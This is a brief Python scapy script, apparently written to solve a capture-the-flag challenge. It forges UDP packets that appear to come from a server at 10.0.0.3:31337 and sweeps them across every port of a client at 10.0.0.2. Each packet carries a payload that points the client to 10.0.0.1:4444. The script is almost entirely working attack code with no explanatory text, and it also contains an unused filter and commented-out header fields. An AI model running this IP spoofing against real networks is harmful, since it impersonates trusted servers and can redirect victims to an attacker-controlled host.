from scapy.all import IP, UDP, Raw, sniff, send, conf

IFACE = "eth0"
SERVER_IP = "10.0.0.3"
CLIENT_IP = "10.0.0.2"
SERVER_PORT = 31337
CLIENT_PORT = 31337

def build_payload(request_payload: bytes) -> bytes:
    return b"FLAG:10.0.0.1:4444"

def handle():
    for i in range(1,65536):
        sport = SERVER_PORT
        dport = i
        resp = (
            IP(src=SERVER_IP, dst=CLIENT_IP) /
            UDP(sport=sport, dport=dport) /
            Raw(load=build_payload(b""))
        )

        # resp[IP].len = None
        # resp[IP].chksum = None
        # resp[UDP].len = None
        # resp[UDP].chksum = None

        send(resp, iface=IFACE, verbose=False)
        print(f"sent spoofed UDP {SERVER_IP}:{sport} -> {CLIENT_IP}:{dport}")

def main():
    bpf = f"udp and host {CLIENT_IP}"
    handle()

if __name__ == "__main__":
    main()
